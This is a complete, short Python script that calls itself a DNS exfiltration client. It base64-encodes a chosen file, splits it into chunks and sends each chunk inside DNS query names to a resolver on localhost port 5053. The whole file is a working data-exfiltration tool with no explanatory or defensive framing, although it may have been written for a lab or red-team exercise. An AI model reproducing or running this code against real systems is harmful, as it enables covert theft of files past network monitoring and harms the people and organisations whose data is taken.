#!/usr/bin/env python3

import dns.resolver
import base64
import argparse

def chunk_data(data, chunk_size):
    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]

def main(file_path):
    with open(file_path, 'r') as file:
        file_data = file.read()

    encoded_data = base64.b64encode(file_data.encode()).decode()

    chunk_size = 50
    chunks = chunk_data(encoded_data, chunk_size)

    resolver = dns.resolver.Resolver()
    resolver.nameservers = ['127.0.0.1']
    resolver.port = 5053

    for i, chunk in enumerate(chunks):
        domain = f"{i}-{chunk}.google.com"
        try:
            result = resolver.resolve(domain, 'A')
        except Exception as e:
            print(f"[+] DNS query failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DNS exfiltration client.")
    parser.add_argument("-f", "--file", required=True, help="Path to the file to exfiltrate.")
    args = parser.parse_args()

    main(args.file)
